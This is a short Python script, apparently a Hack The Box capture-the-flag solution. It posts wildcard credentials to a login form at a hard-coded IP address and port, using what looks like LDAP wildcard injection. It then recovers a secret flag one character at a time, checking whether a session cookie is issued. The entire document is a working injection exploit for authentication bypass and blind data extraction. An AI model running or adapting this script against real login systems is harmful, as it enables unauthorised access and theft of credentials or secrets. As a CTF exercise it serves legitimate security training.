#https://www.dotnetperls.com/ascii-table-python


import requests

host = '178.62.0.100'
port = 30217

def request(prefix):
    url = 'http://{}:{}/login'.format(host, port)

    session = requests.Session()
    data = {'username':'*','password':'{}*'.format(prefix)}
    response = session.post(url, data)

    print(response)
    print(session.cookies.get('mysession'))

    if session.cookies.get('mysession'):
        return True
    else:
        return False

def main():
    flag='HTB{'
    while flag[-1] != '}':
        for i in range(0x20, 0x7f):
            print(chr(i))
            if i == ord('*'):
                continue
            if request(flag + chr(i)) == True:
                flag += chr(i)
                break
    
    print(flag)

main()

